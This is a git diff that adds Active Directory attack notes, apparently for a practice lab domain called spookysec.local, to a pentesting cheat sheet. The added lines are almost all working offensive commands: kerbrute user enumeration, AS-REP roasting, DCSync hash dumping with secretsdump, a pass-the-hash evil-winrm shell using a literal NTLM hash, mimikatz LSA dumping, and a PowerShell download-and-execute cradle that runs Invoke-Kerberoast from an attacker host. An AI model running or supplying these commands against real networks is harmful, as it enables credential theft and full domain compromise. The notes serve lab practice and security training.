@@ -27,3 +27,30 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system
 netsh advfirewall firewall add rule name="psexec-tcp" dir=in action=allow protocol=TCP localport=445
 netsh advfirewall firewall add rule name="psexec-udp" dir=in action=allow protocol=UDP localport=137
 
+# kerbrute enumeration
+./kerbrute userenum --dc spookysec.local -d spookysec.local users.txt -o ker_users.txt
+
+# impacket-GetNPUsers TGT request
+impacket-GetNPUsers spookysec.local/svc-admin -no-pass
+
+# secretsdump.py retrieve all of the password hashes that this user account (that is synced with the domain controller) -- necesitamos saber el password
+secretsdump.py -just-dc spookysec/backup@spookysec.local
+secretsdump.py -just-dc-ntlm spookysec/backup@spookysec.local
+
+# evil-winrm remote shell con hash
+evil-winrm  -i spookysec.local -u Administrator -H '0e0363213e37b94221497260b0bcb4fc'
+
+# powerview
+Enumerate the domain users - Get-NetUser | select cn   
+Enumerate the domain groups - Get-NetGroup -GroupName *admin*  
+enumerate smb share folders - Get-SmbShare
+enumerate OS - Get-NetComputer -fulldata | select operatingsystem
+enumerate kerberoastable users - Get-NetUser -SPN | select samaccountname,description
+
+# mimikatz
+privilege::debug
+lsadump::lsa /patch
+
+# invoke-kerberoast
+python3 -m SimpleHTTPServer 80
+IEX(New-Object Net.WebClient).DownloadString('http://10.14.15.207/Invoke-kerberoast.ps1');Invoke-kerberoast -OutputFormat hashcat | fl
